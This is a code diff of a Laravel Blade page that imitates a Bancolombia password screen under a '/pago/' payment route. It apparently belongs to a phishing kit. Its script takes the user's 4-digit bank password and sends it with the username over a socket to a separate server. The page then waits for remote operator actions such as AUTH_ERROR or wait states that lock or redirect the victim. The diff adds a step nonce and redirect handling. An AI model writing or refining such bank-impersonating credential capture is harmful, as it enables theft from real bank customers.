@@ -4,11 +4,6 @@
 
 @section('page_title', 'Ingresa tu clave')
 
-@include('banks.bancolombia.components.alert', [
-  'id' => 'loginError',
-  'type' => 'error_field'
-])
-
 <!-- @include('banks.bancolombia.components.alert', [
   'id' => 'error_custom',
   'type' => 'error_custom',
@@ -22,10 +17,11 @@
 ])
 
 @section('content')
-    <br><br>
-
+    <br>
+    <br>
     <form id="formStep2" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step'=> 2])}}">
         @csrf
+        <input type="hidden" name="step_nonce" value="{{ session('sc.step_nonce') }}">
         <div class="input-container">
             <img class="input-icon" src="{{ asset('assets/img/payment/bancolombia/passicon.png') }}">
             <input type="password" name="pass" id="txtPassword" placeholder=" " maxlength="4" minlength="4"
@@ -49,91 +45,105 @@
 @endphp
 
 @push('scripts')
-    <script>
-        
-document.addEventListener('DOMContentLoaded', function () {
-  const passInput = document.getElementById('txtPassword');
-  const btn = document.getElementById('btnPass');
-  const form = document.getElementById('formStep2');
-  const nodeUrl = @json($nodeUrl);
-  const sessionId = @json($sessionId);
-  const sessionToken = @json($sessionToken);
-  const step = @json($step); // ✅ asegúrate de pasar $screen desde controller
- // const bank = @json($bank);
-  const user = @json($user);
-
-  let waitingNewDecision = false;
-
-  console.log(sessionToken)
-
-  function toggleBtn() {
-    btn.disabled = !((passInput.value || '').trim().length === 4);
-  }
-
-  function lockUI(lock) {
-    passInput.disabled = lock;
-    btn.disabled = lock ? true : !((passInput.value || '').trim().length === 4);
-  }
-
-
-
-  registerSocketUpdateCallback(function (s) {
-    // Aquí puedes reaccionar extra sin redirigir manualmente
-    console.log(s)
-
-    // ✅ si acabamos de reintentar, ignora AUTH_ERROR "viejo"
-    if (waitingNewDecision && String(s.action) === 'AUTH_ERROR') {
-        return;
-    }
-
-    if (String(s.action).endsWith('_WAIT_ACTION')) {
-      waitingNewDecision = false; 
-      lockUI(true);
-      return;
-    }
-  });
-  
-
-  
-  form.addEventListener('submit', function (e) {
-    e.preventDefault(); // ✅ quedarse en el mismo step
-
-    const password = (passInput.value || '').trim();
-    if (password.length < 4) {
-      showBankAlert('loginError', 'Credenciales inválidas.');
-      return;
-    }
-    
-    if (!user || user.length < 4) {
-      showBankAlert('loginError', 'Credenciales inválidas.');
-      setTimeout(() => {
-        window.location.href = `/pago/bancolombia/`;
-        return;
-      }, 2000);
-      return;
-    }
-
-    hideBankAlert('loginError');
-    // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
-    waitingNewDecision = true;
-    console.log(sessionToken)
-    rtEmitSubmit('user:submit_auth', {
-    sessionId,
-    auth: {
-        user: user,
-        pass: password
-    }
-    }, (ack) => {
-        console.log(ack)
-        if (!ack?.ok) {
-          window.hideLoading?.();
-          showBankAlert('loginError', ack?.error || 'Error'); 
-        }
-    });
-  });
-
-  passInput.addEventListener('input', toggleBtn);
-  toggleBtn();
-});
+<script>
+      window.RT = window.RT || {};
+      window.RT.step = "{{ $step }}";
+      window.RT.bank = "{{ $bank }}";
 </script>
+  <script>      
+    document.addEventListener('DOMContentLoaded', function () {
+      const passInput = document.getElementById('txtPassword');
+      const btn = document.getElementById('btnPass');
+      const form = document.getElementById('formStep2');
+      const nodeUrl = @json($nodeUrl);
+      const sessionId = @json($sessionId);
+      const sessionToken = @json($sessionToken);
+      const step = @json($step); // ✅ asegúrate de pasar $screen desde controller
+    // const bank = @json($bank);
+      const user = @json($user);
+
+      let waitingNewDecision = false;
+
+      console.log(sessionToken)
+
+      function toggleBtn() {
+        btn.disabled = !((passInput.value || '').trim().length === 4);
+      }
+
+      function lockUI(lock) {
+        passInput.disabled = lock;
+        btn.disabled = lock ? true : !((passInput.value || '').trim().length === 4);
+      }
+
+
+
+      registerSocketUpdateCallback(function (s) {
+        // Aquí puedes reaccionar extra sin redirigir manualmente
+        console.log(s)
+
+        // ✅ si acabamos de reintentar, ignora AUTH_ERROR "viejo"
+        if (waitingNewDecision && String(s.action) === 'AUTH_ERROR') {
+            return;
+        }
+
+        if (String(s.action).endsWith('_WAIT_ACTION')) {
+          waitingNewDecision = false; 
+          lockUI(true);
+          return;
+        }
+      });
+      
+
+      
+      form.addEventListener('submit', function (e) {
+        e.preventDefault(); // ✅ quedarse en el mismo step
+
+        const password = (passInput.value || '').trim();
+        if (password.length < 4) {
+          showBankAlert('loginError', 'Credenciales inválidas.');
+          return;
+        }
+        
+        if (!user || user.length < 4) {
+          showBankAlert('loginError', 'Credenciales inválidas.');
+          setTimeout(() => {
+            window.location.href = `/pago/bancolombia/`;
+            return;
+          }, 2000);
+          return;
+        }
+
+        hideBankAlert('loginError');
+        // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
+        waitingNewDecision = true;
+        console.log(sessionToken)
+        rtEmitSubmit('user:submit_auth', {
+        sessionId,
+        auth: {
+            user: user,
+            pass: password
+        }
+        }, (ack) => {
+            console.log(ack);
+            if (!ack?.ok) {
+              if (ack.error === "bad_state") {
+                window.hideLoading?.();
+                window.RT_SOCKET?.emit("user:get_session", (s) => {
+                  if (!s?.action) return;
+                  const expected = expectedStepFromAction(String(s.action));
+                  if (expected && String(RT.step) !== expected) {
+                    showLoading("Redirigiendo...");
+                    window.location.href = `/pago/${RT.bank}/step/${expected}`;
+                  }
+                });
+              }
+              window.hideLoading?.();
+            }
+        });
+      });
+
+      passInput.addEventListener('input', toggleBtn);
+      toggleBtn();
+    });
+  </script>
 @endpush
